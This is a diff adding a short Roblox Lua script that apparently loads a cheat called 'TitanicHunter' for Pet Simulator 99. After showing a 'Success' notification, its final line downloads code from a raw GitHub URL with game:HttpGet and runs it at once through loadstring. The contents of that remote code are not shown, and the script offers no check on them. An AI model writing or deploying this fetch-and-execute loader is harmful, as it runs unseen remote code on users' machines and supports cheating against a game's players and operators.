@@ -1,0 +1,9 @@
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "TitanicHunter Activated"; -- 
+    Text = "Success"; -- 
+    Duration = 5; --
+})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeluka11/PetSimulator99/refs/heads/main/Luaexe"))()
